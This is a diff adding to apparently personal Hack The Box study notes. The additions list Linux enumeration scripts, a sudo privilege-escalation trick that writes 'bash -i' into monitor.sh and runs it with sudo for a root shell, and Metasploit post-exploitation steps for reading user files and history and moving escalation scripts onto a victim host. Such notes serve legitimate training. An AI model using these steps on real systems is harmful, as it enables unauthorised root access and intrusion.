@@ -243,6 +243,20 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 - foxy proxy - install to firefox
 
+**Scripts for enumerating linux** 
+- `LineEnum.sh`
+- `linuxprivchecker.py`
+- You can transfer these files on the machine and then run these scripts to gain privilidge escalation. The goal is to gain root access. 
+- You can create a new folder called personal and then a subdir stuff and place scripts there
+
+- We can also gain sudo level terminal access by running the file that has code to run an interactive bash terminal. This can be run on the victim machine
+- `echo "bash -i" > monitor.sh`
+- `ls`
+- `cat monitor.sh`
+- `ls -la`
+- `chmod +x monitor.sh`
+- `sudo /home/<userdir>/personal/stuff/monitor.sh` When you run this script you will get root access
+
 
 ## Hack the box
 
@@ -260,8 +274,17 @@ General steps:
 - `set password <password>` you are telling metasploit what password to use during the exploit if the exploite will depend on authenticated access and you have already figured out the usernam and password
 - `set username <admin>` you are specifying what username to use
 - `set rhosts <ip address>`
-- `set targeturi /admin.php`
+- `set targeturi </nibbleblog>` this is the path to the 'directory page' where you can run the exploit. For instance <ip address>/<admin page> as in www.goolge.com/admin
 - `options` This will show the targets
+
+- Note that once you gain access then you should thoroughly explore the webpage- especially look for openings where a file maybe uploaded
+- Once you get shell access. you can type `sysinfo`. Look for OS vrsion esp for privilige escalation purposes. `geuid` will tell you what level of user access do you have. 
+- Then you can type `shell` to get into the terminal on that host and then type `pwd` to locate where you are at
+- Then you can type `whoami` it will tell you the user name then type `cd /home` and then `cd <username>` to get into the user dierectory. Then `ls -la`
+- Then you can type `cat user.txt` and `history` to look at all the commands the user has typed or `cat bash_history`
+- You can also type `sudo -l` this will tell you if your username requires a password to run it
+- Now the next step would be to somewho upload a file contaiing privilidge escalation script and then run it on the host to gain root access
+- Note that for example we can use `wget` or `curl` to download the file on our kali linux machine and then through the session created with the victim machne, the file can be transferred over the listening port to the victim 
 
 
 
